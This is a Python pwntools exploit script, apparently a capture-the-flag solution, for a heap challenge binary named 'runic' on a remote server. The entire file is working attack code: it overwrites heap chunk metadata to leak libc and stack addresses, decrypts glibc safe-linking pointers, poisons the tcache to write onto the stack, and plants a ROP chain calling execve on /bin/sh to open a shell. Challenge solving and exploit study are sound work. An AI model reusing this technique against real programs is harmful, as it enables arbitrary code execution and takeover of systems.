#!/usr/bin/python2

from pwn import *

exe = ELF("runic_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so")

context.binary = exe

ru = lambda r,a : r.recvuntil("{}".format(a))
rl = lambda r : r.recvline()
re = lambda r,a : r.recv("{}".format(a))
sl = lambda r,a : r.sendline("{}".format(a))
se = lambda r,a : r.sendline("{}".format(a))
sla = lambda r,a,b : r.sendlineafter("{}".format(a),"{}".format(b))
g = lambda r: gdb.attach(r)
gs = lambda r,a : gdb.attach(r, gdbscript = a)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("167.71.143.44",30468)

    return r

def create_rune(r, name, size, payload):
    sla(r, 'Action:', 1)
    sla(r, ':', name)
    sla(r, ':', size)
    sla(r, ':', payload)

def delete_rune(r, name):
    sla(r, 'Action:', 2)
    sla(r, ':', name)

def edit_rune(r, name, new_name, payload):
    sla(r, 'Action:', 3)
    sla(r, ':', name)
    sla(r, ':', new_name)
    sla(r, ':', payload)

def parse_leak(r, name):
    sla(r, 'Action:', 4)
    sla(r, ':', name)
    ru(r, "CHEF\n")
    leak = u64(re(r,6)+'\x00\x00')
    return leak

def parse_leak2(r, name):
    sla(r, 'Action:', 4)
    sla(r, ':', name)
    ru(r, "CHEF\n")
    leak = u64(re(r,8))
    return leak


def decrypt_ptr(cipher):
    key = 0
    plain = ''

    cipher = cipher
    for i in range(6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits;
        key = plain >> 12
    print hex(key)
    print hex(plain)
    print hex(cipher)

    return plain, key


"""
for a full summary of the code please view the writeup
"""
def main():
    runes = []

    r = conn()

    #small block to start off the exploit
    create_rune(r, 'a', 8, "B"*7)

    #make a larger block, the size is important for overwriting the it's values
    create_rune(r, 'u', 96, "C"*95)

    #make the larger chunk even bigger! with a size of 0x431 it is considered an unsorted chunk
    edit_rune(r, 'a', '\x3f\x00', "A"*0x10+p64(0x431))

    #these will help with overwrites later
    #they also start filling up the new unsorted chunk
    create_rune(r, 't', 80, "D"*50)
    create_rune(r, 's', 80, "E"*50)
    create_rune(r, 'r', 80, "F"*50)
    create_rune(r, 'q', 80, "F"*50)
    create_rune(r, 'p', 0x18, "G"*50) #when fixing the unsorted bin structure, we need to write exactly 0x18 bytes over
                                      #or else we could break the structure
     
    #finish filling up the bin
    for i in range(11):
        print i
        create_rune(r, p64(12+i)[:-1], 0x20, "A")
   
    create_rune(r, p64(12+11)[:-1], 0x30, "A")
    
    log.info("done filling")


    #for leaking the stack
    create_rune(r, p64(33)[:-1], 0x30, 0)
    create_rune(r, p64(34)[:-1], 0x30, 0)
    create_rune(r, p64(35)[:-1], 0x30, 0)

    #for overwriting the return address (need big chunks)
    create_rune(r, p64(37)[:-1], 0x50, 0)
    create_rune(r, p64(38)[:-1], 0x50, 0)
    create_rune(r, p64(39)[:-1], 0x50, 0)

    log.info("setup done triggering vuln")

    #delete the fake chunk, placing libc pointers on the stack
    delete_rune(r, 'u')

    log.info("big block freed")

    #overwrite up to the pointer to grab it
    edit_rune(r, '\x3f\x00', '\x3e\x00', "A"*0x13+"CHEF") # use the s allocation to overwrite the metadata

    libc_leak = parse_leak(r, '\x3e\x00')

    libc_base = libc_leak - 0x1F2CC0

    log.info("libc leak: {}".format(hex(libc_leak)))
    log.info("libc base: {}".format(hex(libc_base)))

    #fix the metadata, this is where the 0x18 size item comes in handy
    edit_rune(r, '\x3e\x00', '\x3a\x00', "A"*0x10+p64(0x431))

    #next step is to leak a stack address
    create_rune(r, 'u', 0x60, "Y"*50)

    delete_rune(r, p64(35)[:-1])
    delete_rune(r, p64(34)[:-1])

    #same deal to overwrite the meta data
    edit_rune(r, p64(33)[:-1], '\x3d\x00', "A"*0x33+"CHEF")

    #grab a ciphered ptr
    weird_ptr = parse_leak(r, '\x3d\x00')
    log.info(hex(weird_ptr))

    #decrypt it, more info from how to heap https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c
    plain_ptr, key = decrypt_ptr(weird_ptr)


    log.info(hex(plain_ptr))
    
    #the environ symbol in libc contains a pointer the the environment variables on the stack
    #the nice part about this is it is fixed, allowing for a deterministic outcome
    environ_libc = 0x1FAEC0 + libc_base #enviorn
    
    log.info("environ: {}".format(hex(environ_libc)))
    environ_cipher = (environ_libc-0x10) ^ key
    
    edit_rune(r, '\x3d\x00', '\x3c\x00', 'A'*0x30+p64(0x21)+p64(environ_cipher))


    create_rune(r, p64(36)[:-1], 0x30, "B")
    #overwrite up to the leak so that puts includes it
    create_rune(r, p64(35)[:-1], 0x30, "A"*3+"CHEF")

    stack_leak = parse_leak(r, p64(35)[:1])


    log.info("leaked_ptr: {}".format(hex(stack_leak)))

    stack_write = stack_leak - 0x158

    log.info("to write: {}".format(hex(stack_write)))

    #setup the poisoned tchace for size 0x60, can no longer use the previous size, as the pointers have been
    #corrupted also, need size 60 for the final overwrite
    delete_rune(r,p64(39)[:-1])
    delete_rune(r,p64(38)[:-1])
    edit_rune(r, p64(37)[:-1], '\x3f\x00\x01', "A"*0x53+"CHEF")

    #leak the pointer so I can properly overwrite the next pointer in the tchace
    new_cipher = parse_leak(r, '\x3f\x00\x01')
    plain_ptr, key = decrypt_ptr(new_cipher)

    log.info("2nd ptr: {}".format(hex(plain_ptr)))

    edit_rune(r, '\x3f\x00\x01', '\x3f\x00\x02', "Z"*0x50+ p64(0x51)+p64(stack_write ^ key))

    create_rune(r, p64(41)[:-1], 0x50, 'Y')

    #can't use the one gadget for this challenge
    #the execvpe.c file was not found. I could be wrong, but I think this is intentional
    #one_gadget = libc_base + 0xda7e1

    #get the
    pop_rsi = libc_base + 0x0000000000037c2a#: pop rsi; ret;
    pop_rdx = libc_base + 0x000000000010b127#: pop rdx; ret;
    syscall = libc_base + 0x00000000000883d6#: syscall; ret;
    pop_rax = libc_base + 0x00000000000446e0#: pop rax; ret;
    bin_sh  = libc_base + 0x1B4689
    pop_rdi = libc_base + 0x000000000002daa2#: pop rdi; ret#

    #build a rop chain to call the execve syscall with the correct values
    payload = p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(bin_sh) #address of /bin/sh in libc
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax) #its lucky there was a pop rax gadget
    payload += p64(59)
    payload += p64(syscall)

    log.info("writting rop chain over create's return ptr")
    #write the rop chain to the leaked stack ptr
    create_rune(r, p64(39)[:-1], 0x50, payload)

    log.info("enjoy the shell ;)")
    r.interactive()

if __name__ == "__main__":
    main()
